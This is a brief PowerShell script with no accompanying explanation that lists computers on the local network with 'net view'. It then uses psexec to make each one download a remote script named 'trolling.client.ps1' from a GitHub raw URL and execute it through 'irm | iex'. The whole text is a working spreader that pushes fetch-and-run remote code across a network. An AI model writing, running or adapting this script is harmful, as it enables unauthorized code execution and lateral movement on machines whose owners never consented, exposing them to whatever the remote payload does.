$computers = (net view | Select-String "\\" | ForEach-Object { $_.ToString().Trim().Split(" ")[0].Trim("\") })
foreach ($computer in $computers) {
    Start-Process -FilePath "psexec.exe" -ArgumentList "\\\\$computer \"powershell -Command irm https://raw.githubusercontent.com/TheSashkin/redirector/refs/heads/main/trolling.client.ps1 | iex\"" -NoNewWindow -Wait
}